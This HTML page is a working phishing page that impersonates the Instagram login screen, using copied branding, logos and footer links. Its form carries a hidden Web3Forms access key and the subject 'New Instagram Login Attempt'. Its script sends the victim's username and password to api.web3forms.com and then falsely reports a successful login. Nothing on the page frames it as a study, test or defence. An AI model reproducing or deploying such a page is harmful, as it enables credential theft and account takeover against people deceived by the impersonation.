<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: rgb(250, 250, 250);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #262626;
        }
        
        .container {
            max-width: 935px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .phone-image {
            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones-2x.png/cbc7174b4f05.png');
            background-position: -46px 0;
            background-size: 468.32px 634.15px;
            height: 581.15px;
            width: 380.32px;
            margin-right: 32px;
            display: none;
        }
        
        .login-box {
            max-width: 350px;
            width: 100%;
        }
        
        .white-box {
            background-color: white;
            border: 1px solid rgb(219, 219, 219);
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        form {
            margin-top: 24px;
        }
        
        input {
            background: rgb(250, 250, 250);
            border: 1px solid rgb(219, 219, 219);
            border-radius: 3px;
            color: rgb(38, 38, 38);
            font-size: 12px;
            padding: 9px 8px 7px;
            width: 100%;
            margin-bottom: 6px;
            height: 36px;
        }
        
        input:focus {
            border: 1px solid rgb(168, 168, 168);
            outline: none;
        }
        
        button {
            background-color: rgb(0, 149, 246);
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            margin-top: 8px;
            cursor: pointer;
            height: 32px;
            font-size: 14px;
        }
        
        button:disabled {
            background-color: rgba(0, 149, 246, 0.3);
            cursor: default;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: rgb(219, 219, 219);
        }
        
        .divider-text {
            color: rgb(142, 142, 142);
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        
        .facebook-login {
            color: rgb(56, 81, 133);
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }
        
        .facebook-icon {
            margin-right: 8px;
            font-size: 16px;
            font-weight: bold;
        }
        
        .forgot-password {
            color: rgb(0, 55, 107);
            font-size: 12px;
            margin-top: 12px;
            display: block;
            text-decoration: none;
        }
        
        .signup-box {
            background-color: white;
            border: 1px solid rgb(219, 219, 219);
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-link {
            color: rgb(0, 149, 246);
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-download p {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-store-img {
            height: 40px;
        }
        
        #result {
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
        
        footer {
            text-align: center;
            margin-top: 24px;
            font-size: 12px;
            color: rgb(142, 142, 142);
            max-width: 350px;
            width: 100%;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 16px;
        }
        
        .footer-link {
            margin: 0 8px 12px;
            text-decoration: none;
            color: rgb(142, 142, 142);
        }
        
        .copyright {
            text-transform: uppercase;
        }
        
        @media (min-width: 876px) {
            .phone-image {
                display: block;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-image"></div>
        
        <div class="login-box">
            <div class="white-box">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
                
                <form id="loginForm">
                    <input type="hidden" name="access_key" value="b229c2dd-94bb-4f78-a091-342d1602c3c1">
                    <input type="hidden" name="subject" value="New Instagram Login Attempt">
                    <input type="hidden" name="redirect" value="https://instagram.com">
                    
                    <input type="text" name="name" placeholder="Phone number, username, or email" required>
                    <input type="password" name="email" placeholder="Password" required>
                    <button type="submit" id="loginButton">Log In</button>
                    
                    <div class="divider">
                        <div class="divider-text">or</div>
                    </div>
                    
                    <div class="facebook-login">
                        <span class="facebook-icon">f</span>
                        Log in with Facebook
                    </div>
                    
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>
                
                <div id="result"></div>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#" class="signup-link">Sign up</a>
            </div>
            
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-stores">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-store-img">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-store-img">
                </div>
            </div>
            
            <footer>
                <div class="footer-links">
                    <a href="#" class="footer-link">Meta</a>
                    <a href="#" class="footer-link">About</a>
                    <a href="#" class="footer-link">Blog</a>
                    <a href="#" class="footer-link">Jobs</a>
                    <a href="#" class="footer-link">Help</a>
                    <a href="#" class="footer-link">API</a>
                    <a href="#" class="footer-link">Privacy</a>
                    <a href="#" class="footer-link">Terms</a>
                    <a href="#" class="footer-link">Top Accounts</a>
                    <a href="#" class="footer-link">Hashtags</a>
                    <a href="#" class="footer-link">Locations</a>
                    <a href="#" class="footer-link">Instagram Lite</a>
                    <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
                </div>
                <div class="copyright">
                    Â© 2023 Instagram from Meta
                </div>
            </footer>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const form = e.target;
            const result = document.getElementById('result');
            const formData = new FormData(form);

            result.textContent = "Logging in...";
            result.style.display = "block";
            result.style.color = "black";
            document.getElementById('loginButton').disabled = true;

            try {
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(Object.fromEntries(formData))
                });

                const json = await response.json();

                if (response.ok) {
                    result.textContent = "Login successful! Redirecting...";
                    result.style.color = "green";
                    // You can redirect after successful submission if needed
                    // window.location.href = "https://instagram.com";
                } else {
                    result.textContent = json.message || "Login failed. Please try again.";
                    result.style.color = "red";
                }
            } catch (error) {
                console.error(error);
                result.textContent = "Network error. Please check your connection.";
                result.style.color = "red";
            } finally {
                document.getElementById('loginButton').disabled = false;
                setTimeout(() => {
                    result.style.display = "none";
                }, 5000);
            }
        });
    </script>
</body>
</html>
